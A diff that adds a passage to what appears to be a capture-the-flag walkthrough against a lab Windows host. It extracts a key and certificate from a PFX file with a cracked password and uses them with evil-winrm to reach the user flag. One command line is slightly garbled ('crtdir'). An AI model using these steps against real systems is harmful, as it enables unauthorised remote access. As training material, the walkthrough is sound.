@@ -194,14 +194,51 @@ john --wordlist=rockyou.txt pfx_hash.txt
 thuglegacy       (pfx_hash.txt)
 ```
 
+With the password, I can extract the key and certificate.
+
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+```
+
+Decrypt the key using the password set above so we don’t have to remember it:
+
+```bash
+openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
+Enter pass phrase for legacyy_dev_auth.key-enc:
+writing RSA key
+```
+
+Dump the certificate:
+
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
+Enter Import Password:
+```
+
+Use `evil-winrm` to connect to host and retrieve the user flag:
+
+* `-S` - Enable SSL, because I’m connecting to 5986;
+* `-c` legacyy_dev_auth.crt - provide the public key certificate
+* `-k` legacyy_dev_auth.key - provide the private key
+
+```bash
+evil-winrm -i 10.10.11.152 -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crtdir
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir
 
 
+    Directory: C:\Users\legacyy\Desktop
 
 
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        6/15/2024  11:30 AM             34 user.txt
+```
 
-
-
-
+# Root Flag
 
 
 
